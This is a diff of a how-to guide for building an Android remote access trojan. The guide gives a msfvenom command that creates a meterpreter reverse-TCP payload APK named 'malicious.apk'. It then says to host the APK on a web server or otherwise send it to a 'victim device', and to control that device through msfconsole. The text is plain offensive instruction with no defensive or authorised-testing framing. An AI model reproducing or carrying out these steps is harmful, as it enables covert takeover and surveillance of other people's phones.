@@ -39,18 +39,20 @@ A Guide for making you own RAT(Remote access tool) for android with the help of 
 
 10. We are using msfvenom for creating payload.
     (msfvenom -p android/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<port> R > malicious.apk).
+
+    
    ![Screenshot 2025-01-02 191802](https://github.com/user-attachments/assets/3e9ed813-a821-4079-b78f-e03817f94de2)
 
-11. LHOST: Your IP address (use ifconfig to find it).  
+12. LHOST: Your IP address (use ifconfig to find it).  
      LPORT: A port number for listening (e.g., 4444).  
      malicious.apk: The name of the APK file created.
 ![Screenshot 2025-01-02 191825](https://github.com/user-attachments/assets/26b29ecf-5f1e-451c-83f4-61132521c0ab)
 
-12. After creating apk you can upload it to you server show that anyone with you link can download or you can share apk any way to victim device.
+13. After creating apk you can upload it to you server show that anyone with you link can download or you can share apk any way to victim device.
 
     (mv malicious.apk /var/www/html/) for moving apk to server.
 
-13. Now open msfconsole to monitro the apk and perform task on it on victim device.
+14. Now open msfconsole to monitro the apk and perform task on it on victim device.
 ![Screenshot 2025-01-02 193021](https://github.com/user-attachments/assets/192ce1fd-543d-4fc8-add0-7d01b71a9550)
 ![Screenshot 2025-01-02 193046](https://github.com/user-attachments/assets/d072d315-4dfc-49c9-9d1e-21bdd957e387)
 
